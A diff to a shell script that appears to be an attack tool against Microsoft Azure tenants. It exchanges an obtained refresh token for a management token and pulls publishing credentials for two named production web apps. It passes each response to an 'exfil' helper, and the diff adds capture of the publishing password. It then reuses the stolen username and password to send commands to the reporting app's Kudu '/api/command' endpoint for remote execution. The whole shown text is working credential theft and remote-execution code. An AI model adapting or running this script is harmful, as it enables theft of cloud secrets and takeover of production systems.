@@ -116,17 +116,21 @@ RAT=$(curl -sS -m 20 -X POST "https://login.microsoftonline.com/$RT/oauth2/v2.0/
   python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
 say "REPORTING_ARM_LEN=${#RAT}"
 
+RPT_PU="" RPT_PP=""
 for SITE_RG in "rg-tbl-reporting-prod-eus/app-tbl-reporting-prod" "rg-tbl-platform-prod-sea/app-tbl-storefront-prod"; do
   RG2=${SITE_RG%/*}; SITE=${SITE_RG#*/}
   PC=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $RAT" -H 'Content-Length: 0' \
     "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/providers/Microsoft.Web/sites/$SITE/config/publishingcredentials/list?api-version=2023-01-01")
   PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
+  PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
   say "KUDU_${SITE}=$([ -n "$PU" ] && echo OK || echo FAIL)"
   exfil "kudu-${SITE}" "$PC"
+  if [ "$SITE" = "app-tbl-reporting-prod" ] && [ -n "$PU" ] && [ -n "$PP" ]; then
+    RPT_PU="$PU"; RPT_PP="$PP"
+  fi
 done
 
-PU=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
-PP=$(echo "$PC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
+PU="$RPT_PU"; PP="$RPT_PP"
 if [ -n "$PU" ] && [ -n "$PP" ]; then
   SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
   OUT=$(curl -sS -m 90 -u "$PU:$PP" -H 'Content-Type: application/json' -X POST "$SCM/api/command" \
